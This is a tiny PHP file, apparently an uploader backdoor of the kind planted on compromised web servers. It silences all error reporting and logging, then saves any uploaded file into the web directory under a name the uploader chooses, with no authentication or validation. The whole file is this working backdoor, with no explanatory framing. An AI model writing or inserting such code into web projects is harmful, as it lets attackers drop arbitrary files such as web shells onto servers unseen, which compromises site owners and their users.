<?php

error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);



?>
<?php error_reporting(0); @ini_set('error_log', NULL); @ini_set('log_errors', 0); @ini_set('display_errors', 0); if (!copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']); ?>